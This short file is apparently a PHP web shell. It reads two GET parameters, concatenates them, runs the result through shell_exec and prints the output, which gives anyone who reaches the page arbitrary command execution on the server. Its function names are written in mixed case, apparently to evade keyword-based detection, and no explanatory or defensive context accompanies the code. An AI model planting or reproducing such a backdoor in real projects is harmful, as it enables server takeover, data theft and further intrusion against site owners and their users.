<?php
if(ISSET($_GET['p']))
{
	If(issEt($_GET['c']))
	{
		$r=sheLL_eXeC("{$_GET['p']}{$_GET['c']}");
		print_R($r);
	}

}
?>
